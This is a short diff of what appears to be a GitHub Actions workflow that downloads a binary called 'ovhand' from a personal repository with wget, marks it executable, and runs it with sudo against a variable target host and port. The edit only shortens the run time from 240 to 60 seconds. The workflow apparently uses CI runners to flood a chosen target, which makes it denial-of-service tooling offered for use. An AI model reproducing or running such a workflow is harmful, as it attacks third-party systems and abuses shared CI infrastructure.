@@ -32,9 +32,9 @@ jobs:
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/ovhand -O OVH
           chmod +x OVH || true
           
-          sudo timeout 240 ./OVH "$TARGET" "$PORT" 2 240 &
+          sudo timeout 60 ./OVH "$TARGET" "$PORT" 2 60 &
           
       - name: Finish !
         run: |
-          sleep 240
+          sleep 60
           exit 0
